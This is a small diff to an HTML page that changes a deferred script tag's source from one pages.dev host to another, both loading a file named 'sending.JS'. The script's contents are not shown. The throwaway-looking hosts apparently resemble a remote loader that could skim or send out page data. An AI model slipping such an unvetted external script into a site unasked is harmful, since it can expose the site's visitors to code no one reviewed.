@@ -312,7 +312,7 @@
         
     >
 
-    <script src="https://cdn-sending.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/sending.JS" defer></script>
+    <script src="https://cdn-globaljs-3lz.pages.dev/cdn-globaljs/MainJS/UpperJS/DeliverJS/sending.JS" defer></script>
     
 
         <script nonce="+gWSoSeB7oJ/5IB7H6o53UJw">
